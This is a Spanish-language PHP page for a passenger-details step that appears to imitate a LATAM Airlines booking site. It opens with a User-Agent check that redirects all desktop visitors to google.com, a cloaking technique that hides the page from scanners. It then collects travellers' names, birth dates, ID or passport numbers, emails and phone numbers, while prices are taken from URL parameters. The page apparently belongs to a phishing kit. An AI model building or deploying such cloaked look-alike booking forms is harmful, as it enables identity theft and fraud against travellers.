<?php

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

$mobileKeywords = [
    'Mobi', 'Android', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 
    'webOS', 'Windows Phone', 'Kindle', 'Opera Mini'
];

$isMobile = false;

foreach ($mobileKeywords as $keyword) {
    if (stripos($userAgent, $keyword) !== false) {
        $isMobile = true;
        break;
    }
}

if (!$isMobile) {
    header('Location: https://www.google.com');
    exit;
}

?>
<?php
// Función auxiliar para sanitizar la entrada
function sanitize_form_input($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
}

// Extraer el número de pasajeros para generar los formularios
$passengers_str = isset($_GET['passengers']) ? sanitize_form_input($_GET['passengers']) : '1 adulto';
if (preg_match('/(\d+)/', $passengers_str, $m)) {
    $passengers_count = max(1, (int)$m[1]);
} else {
    $passengers_count = 1;
}

// --- Recopilación de datos del GET para el resumen ---
$out_price = isset($_GET['out_price']) ? (int)$_GET['out_price'] : 0;
$ret_price = isset($_GET['ret_price']) ? (int)$_GET['ret_price'] : 0;
$total_vuelos = $out_price + $ret_price;

$total_asientos = 0;
for ($i = 1; $i <= $passengers_count; $i++) {
    $total_asientos += isset($_GET["out_seat_price_{$i}"]) ? (int)$_GET["out_seat_price_{$i}"] : 0;
    $total_asientos += isset($_GET["ret_seat_price_{$i}"]) ? (int)$_GET["ret_seat_price_{$i}"] : 0;
}

$total_equipaje = 0; // Se mantiene en 0 pero se podría usar en el futuro
$total_impuestos = ($total_vuelos) * 0.19;
$precio_final = $total_vuelos + $total_asientos + $total_equipaje + $total_impuestos;

// Datos de vuelos
$origin_city = explode(',', sanitize_form_input($_GET['origin']))[0];
$destination_city = explode(',', sanitize_form_input($_GET['destination']))[0];
$departure_date_ida = isset($_GET['departure-date']) ? sanitize_form_input($_GET['departure-date']) : '';
$out_dep_time = isset($_GET['out_dep_time']) ? sanitize_form_input($_GET['out_dep_time']) : '';
$out_dep_airport = isset($_GET['out_dep_airport']) ? sanitize_form_input($_GET['out_dep_airport']) : '';
$out_arr_time = isset($_GET['out_arr_time']) ? sanitize_form_input($_GET['out_arr_time']) : '';
$out_arr_airport = isset($_GET['out_arr_airport']) ? sanitize_form_input($_GET['out_arr_airport']) : '';
$out_cabin = isset($_GET['cabin']) ? sanitize_form_input($_GET['cabin']) : '';
$out_tariff = isset($_GET['out_tariff']) ? sanitize_form_input($_GET['out_tariff']) : '';

$is_one_way = empty($_GET['ret_dep_time']);
$departure_date_vuelta = isset($_GET['return-date']) ? sanitize_form_input($_GET['return-date']) : '';
$ret_dep_time = isset($_GET['ret_dep_time']) ? sanitize_form_input($_GET['ret_dep_time']) : '';
$ret_dep_airport = isset($_GET['ret_dep_airport']) ? sanitize_form_input($_GET['ret_dep_airport']) : '';
$ret_arr_time = isset($_GET['ret_arr_time']) ? sanitize_form_input($_GET['ret_arr_time']) : '';
$ret_arr_airport = isset($_GET['ret_arr_airport']) ? sanitize_form_input($_GET['ret_arr_airport']) : '';
$ret_tariff = isset($_GET['ret_tariff']) ? sanitize_form_input($_GET['ret_tariff']) : '';

// Lista de países
$paises = [
    "Latinoamérica" => ["Argentina", "Bolivia", "Brasil", "Chile", "Colombia", "Costa Rica", "Cuba", "Ecuador", "El Salvador", "Guatemala", "Honduras", "México", "Nicaragua", "Panamá", "Paraguay", "Perú", "República Dominicana", "Uruguay", "Venezuela"],
    "Europa" => ["Alemania", "España", "Francia", "Italia", "Portugal", "Reino Unido"],
    "América del Norte" => ["Estados Unidos", "Canadá"]
];
?>

<head>
    <link rel="stylesheet" href="assets/css/form.css">
    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.2.0/fonts/remixicon.css" rel="stylesheet"/>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
</head>

<div class="form-container">
    <form id="main-form" action="partials/resultados-vuelos.php" method="POST" class="passenger-forms">
        <h1 class="main-title">¿Quiénes viajan?</h1>

        <!-- Campos ocultos para pasar toda la información existente -->
        <?php foreach ($_GET as $key => $value): ?>
            <input type="hidden" name="<?php echo htmlspecialchars($key); ?>" value="<?php echo htmlspecialchars($value); ?>">
        <?php endforeach; ?>

        <?php for ($i = 1; $i <= $passengers_count; $i++): ?>
        <div class="passenger-accordion">
            <button type="button" class="accordion-header">
                <div class="accordion-title-default">
                    <i class="ri-user-line"></i>
                    <span>Adulto <?php echo $i; ?></span>
                </div>
                <div class="accordion-title-confirmed" style="display: none;">
                    <!-- Contenido dinámico con JS -->
                </div>
                <div class="confirmation-icons">
                    <i class="ri-checkbox-circle-fill success-icon" style="display: none;"></i>
                    <i class="ri-arrow-down-s-line accordion-arrow"></i>
                </div>
            </button>
            <div class="accordion-content">
                <div class="form-wrapper">
                    <div class="form-grid">
                        <div class="input-group">
                            <input type="text" name="nombre[]" id="nombre-<?php echo $i; ?>" placeholder=" " required>
                            <label for="nombre-<?php echo $i; ?>">Nombre</label>
                        </div>
                        <div class="input-group">
                            <input type="text" name="apellido[]" id="apellido-<?php echo $i; ?>" placeholder=" " required>
                            <label for="apellido-<?php echo $i; ?>">Apellido</label>
                        </div>
                        <div class="input-group">
                            <input type="text" name="fecha_nacimiento[]" class="date-input" id="fecha-nacimiento-<?php echo $i; ?>" placeholder=" " required maxlength="10">
                            <label for="fecha-nacimiento-<?php echo $i; ?>">Fecha de nacimiento *</label>
                        </div>
                        <div class="input-group">
                            <select name="genero[]" id="genero-<?php echo $i; ?>" required>
                                <option>Masculino</option>
                                <option>Femenino</option>
                                <option>Otro</option>
                            </select>
                            <label for="genero-<?php echo $i; ?>">Género</label>
                        </div>
                        <div class="input-group">
                            <select name="nacionalidad[]" id="nacionalidad-<?php echo $i; ?>" required>
                                <?php foreach ($paises as $region => $lista_paises): ?>
                                    <optgroup label="<?php echo $region; ?>">
                                        <?php foreach ($lista_paises as $pais): ?>
                                            <option value="<?php echo $pais; ?>" <?php echo ($pais === 'Colombia') ? 'selected' : ''; ?>>
                                                <?php echo $pais; ?>
                                            </option>
                                        <?php endforeach; ?>
                                    </optgroup>
                                <?php endforeach; ?>
                            </select>
                            <label for="nacionalidad-<?php echo $i; ?>">Nacionalidad</label>
                        </div>
                        <div class="input-group">
                            <select name="tipo_documento[]" id="tipo-documento-<?php echo $i; ?>" required>
                                <option>Cédula de Ciudadanía</option>
                                <option>Pasaporte</option>
                            </select>
                            <label for="tipo-documento-<?php echo $i; ?>">Tipo de documento</label>
                        </div>
                        <div class="input-group">
                            <input type="text" name="numero_documento[]" id="numero-documento-<?php echo $i; ?>" placeholder=" " required>
                            <label for="numero-documento-<?php echo $i; ?>">Número de documento</label>
                        </div>
                         <div class="input-group">
                            <input type="text" name="pasajero_frecuente[]" id="pasajero-frecuente-<?php echo $i; ?>" placeholder=" ">
                            <label for="pasajero-frecuente-<?php echo $i; ?>">Nº de pasajero frecuente (opcional)</label>
                        </div>
                        <div class="input-group">
                            <select name="aerolinea_frecuente[]" id="aerolinea-<?php echo $i; ?>">
                                <option>LATAM Airlines Group</option>
                                <option>Otra</option>
                            </select>
                            <label for="aerolinea-<?php echo $i; ?>">Aerolínea</label>
                        </div>
                    </div>
                    <p class="form-hint">Para que esta persona disfrute sus beneficios</p>
                    
                    <?php if ($i === 1): // Mostrar solo para el primer pasajero ?>
                    <h2 class="contact-title">Información de contacto</h2>
                    <div class="form-grid-contact">
                        <div class="input-group">
                            <input type="email" name="email_contacto" id="email-<?php echo $i; ?>" placeholder=" " required>
                            <label for="email-<?php echo $i; ?>">Email</label>
                        </div>
                        <div class="input-group-phone">
                            <div class="input-group">
                                <select name="codigo_pais_contacto" id="codigo-pais-<?php echo $i; ?>" required>
                                    <option>+57</option>
                                    <option>+1</option>
                                </select>
                                 <label for="codigo-pais-<?php echo $i; ?>">Código</label>
                            </div>
                            <div class="input-group">
                                <input type="tel" name="telefono_contacto" id="numero-telefono-<?php echo $i; ?>" placeholder=" " required>
                                <label for="numero-telefono-<?php echo $i; ?>">Número</label>
                            </div>
                        </div>
                    </div>
                    <div class="checkbox-group">
                        <input type="checkbox" id="repeat-contact">
                        <label for="repeat-contact">Repetir información de contacto para el resto de pasajeros.</label>
                    </div>
                    <?php endif; ?>

                    <div class="form-actions">
                        <button type="button" class="confirm-btn">Confirmar datos</button>
                    </div>
                </div>
            </div>
        </div>
        <?php endfor; ?>
    </form>

    <aside class="travel-summary">
        <h2 class="summary-title">Detalle de viaje</h2>
        
        <div class="summary-accordion">
            <button type="button" class="accordion-header">
                <div class="accordion-title">
                    <i class="ri-flight-takeoff-line"></i>
                    <span>Vuelos</span>
                </div>
                <div class="accordion-price">
                    <span>COP <?php echo number_format($total_vuelos, 0, ',', '.'); ?></span>
                    <i class="ri-arrow-down-s-line accordion-arrow"></i>
                </div>
            </button>
            <div class="summary-details">
                <div class="flight-segment">
                    <p class="segment-title">De <?php echo $origin_city; ?> a <?php echo $destination_city; ?></p>
                    <p class="segment-info"><?php echo $departure_date_ida; ?></p>
                    <p class="segment-info"><?php echo $out_dep_time; ?> <?php echo $out_dep_airport; ?> → <?php echo $out_arr_time; ?> <?php echo $out_arr_airport; ?></p>
                    <p class="segment-info">Cabina: <?php echo $out_cabin; ?> - Tarifa: <?php echo $out_tariff; ?></p>
                    <p class="segment-info"><?php echo $passengers_count; ?> Adultos</p>
                </div>
                <?php if(!$is_one_way): ?>
                 <div class="flight-segment">
                    <p class="segment-title">De <?php echo $destination_city; ?> a <?php echo $origin_city; ?></p>
                    <p class="segment-info"><?php echo $departure_date_vuelta; ?></p>
                    <p class="segment-info"><?php echo $ret_dep_time; ?> <?php echo $ret_dep_airport; ?> → <?php echo $ret_arr_time; ?> <?php echo $ret_arr_airport; ?></p>
                    <p class="segment-info">Cabina: <?php echo $out_cabin; ?> - Tarifa: <?php echo $ret_tariff; ?></p>
                    <p class="segment-info"><?php echo $passengers_count; ?> Adultos</p>
                </div>
                <?php endif; ?>
            </div>
        </div>

        <div class="summary-accordion">
            <button type="button" class="accordion-header">
                <div class="accordion-title">
                    <i class="ri-shopping-cart-line"></i>
                    <span>Asientos</span>
                </div>
                <div class="accordion-price">
                    <span>COP <?php echo number_format($total_asientos, 0, ',', '.'); ?></span>
                    <i class="ri-arrow-down-s-line accordion-arrow"></i>
                </div>
            </button>
             <div class="summary-details">
                <p class="segment-title">Vuelo de Ida</p>
                <?php for ($i = 1; $i <= $passengers_count; $i++): ?>
                    <div class="seat-segment">
                        <p class="segment-info">Adulto <?php echo $i; ?></p>
                        <p class="segment-info"><b><?php echo sanitize_form_input($_GET["out_seat_{$i}"] ?? 'N/A'); ?></b> / Economy</p>
                        <p class="segment-price">COP <?php echo number_format((int)(sanitize_form_input($_GET["out_seat_price_{$i}"] ?? 0)), 0, ',', '.'); ?></p>
                    </div>
                <?php endfor; ?>

                <?php if(!$is_one_way): ?>
                <p class="segment-title" style="margin-top: 16px;">Vuelo de Vuelta</p>
                <?php for ($i = 1; $i <= $passengers_count; $i++): ?>
                    <div class="seat-segment">
                        <p class="segment-info">Adulto <?php echo $i; ?></p>
                        <p class="segment-info"><b><?php echo sanitize_form_input($_GET["ret_seat_{$i}"] ?? 'N/A'); ?></b> / Economy</p>
                        <p class="segment-price">COP <?php echo number_format((int)(sanitize_form_input($_GET["ret_seat_price_{$i}"] ?? 0)), 0, ',', '.'); ?></p>
                    </div>
                <?php endfor; ?>
                <?php endif; ?>
            </div>
        </div>
        
        <div class="final-price-container">
            <div class="price-labels">
                <span>Precio final</span>
                <p>Incluye tasas, cargos e impuestos</p>
            </div>
            <div class="price-amount">
                <span>COP <?php echo number_format($precio_final, 0, ',', '.'); ?></span>
            </div>
        </div>

        <div class="summary-actions">
            <button type="submit" form="main-form" class="continue-btn">Continuar</button>
        </div>
    </aside>
</div>

<div class="mobile-footer">
    <button type="submit" form="main-form" class="continue-btn">Continuar</button>
</div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    const mainForm = document.getElementById('main-form');
    const accordions = document.querySelectorAll('.passenger-accordion');

    accordions.forEach((accordion, index) => {
        const header = accordion.querySelector('.accordion-header');
        const content = accordion.querySelector('.accordion-content');
        const arrow = header.querySelector('.accordion-arrow');

        if (index === 0) {
            content.style.maxHeight = content.scrollHeight + 'px';
            accordion.classList.add('open');
            arrow.classList.add('open');
        }

        header.addEventListener('click', () => {
            const wasOpen = accordion.classList.contains('open');

            accordions.forEach(acc => {
                acc.classList.remove('open');
                acc.querySelector('.accordion-content').style.maxHeight = null;
                acc.querySelector('.accordion-arrow').classList.remove('open');
            });

            if (!wasOpen) {
                accordion.classList.add('open');
                content.style.maxHeight = content.scrollHeight + 'px';
                arrow.classList.add('open');
            }
        });
    });

    const confirmButtons = document.querySelectorAll('.confirm-btn');
    confirmButtons.forEach(button => {
        button.addEventListener('click', (e) => {
            const accordion = e.target.closest('.passenger-accordion');
            const accordionContent = accordion.querySelector('.accordion-content');
            const inputs = accordionContent.querySelectorAll('input[required], select[required]');
            let allValid = true;

            inputs.forEach(input => {
                if (!input.checkValidity()) {
                    allValid = false;
                    input.classList.add('error'); 
                } else {
                    input.classList.remove('error');
                }
            });

            if (allValid) {
                const header = accordion.querySelector('.accordion-header');
                const defaultTitle = header.querySelector('.accordion-title-default');
                const confirmedTitle = header.querySelector('.accordion-title-confirmed');
                const successIcon = header.querySelector('.success-icon');
                
                const nombre = accordion.querySelector('input[name="nombre[]"]').value;
                const apellido = accordion.querySelector('input[name="apellido[]"]').value;
                const tipoDoc = accordion.querySelector('select[name="tipo_documento[]"]').value;
                const numDoc = accordion.querySelector('input[name="numero_documento[]"]').value;
                
                const iniciales = (nombre.charAt(0) + apellido.charAt(0)).toUpperCase();

                confirmedTitle.innerHTML = `
                    <div class="avatar">${iniciales}</div>
                    <div class="passenger-info">
                        <span class="passenger-name">${nombre} ${apellido}</span>
                        <span class="passenger-doc">${tipoDoc} - ${numDoc}</span>
                    </div>
                `;
                
                defaultTitle.style.display = 'none';
                confirmedTitle.style.display = 'flex';
                successIcon.style.display = 'inline-block';
                
                header.click();
            } else {
                alert('Por favor, completa todos los campos requeridos para este pasajero.');
            }
        });
    });

    mainForm.addEventListener('submit', (e) => {
        if (!mainForm.checkValidity()) {
            e.preventDefault();
            alert('Faltan datos de uno o más pasajeros. Por favor, revisa la información.');
            for (let accordion of accordions) {
                const invalidInput = accordion.querySelector(':invalid');
                if (invalidInput) {
                    if (!accordion.classList.contains('open')) {
                        accordion.querySelector('.accordion-header').click();
                    }
                    break;
                }
            }
        }
    });
    
    const dateInputs = document.querySelectorAll('.date-input');
    dateInputs.forEach(input => {
        input.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.substring(0, 2) + '-' + value.substring(2);
            }
            if (value.length > 5) {
                value = value.substring(0, 5) + '-' + value.substring(5, 9);
            }
            e.target.value = value;
        });
    });

    const summaryAccordions = document.querySelectorAll('.summary-accordion .accordion-header');
    summaryAccordions.forEach(header => {
        header.addEventListener('click', () => {
            const details = header.nextElementSibling;
            const arrow = header.querySelector('.accordion-arrow');
            if (details && details.classList.contains('summary-details')) {
                const isOpen = details.style.maxHeight;
                if (isOpen){
                    details.style.maxHeight = null;
                } else {
                    details.style.maxHeight = details.scrollHeight + "px";
                }
                arrow.classList.toggle('open');
            }
        });
    });
});
</script>
